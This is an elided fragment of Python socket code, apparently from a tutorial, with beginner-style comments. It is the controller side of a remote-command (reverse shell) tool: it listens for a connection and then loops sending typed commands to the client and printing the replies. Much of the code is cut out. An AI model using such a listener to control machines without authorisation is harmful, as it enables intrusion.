...
def socket_bind():
    try:
        ...
        s.listen(
            5
        )  # listen allows server to accept connections, number 5 is number of bad connections it will take before refusing
    except socket.error as msg:
...
def send_commands(conn):
    while True:  # infinite loop for connection to stay constant
        ...
        if len(
                str.encode(cmd)
        ) > 0:  # check that the command is not empty, otherwise do not send across network
            conn.send(str.encode(cmd))
            client_response = str(
                conn.recv(1024), "utf-8"
            )  # 1024 is buffer size, utf-8 to convert to normal string
            print(
                client_response, end=""
...
def main():
    ...
    socket_bind()
    socket_accept(
    )  # no need send_commands as this function calls that when called
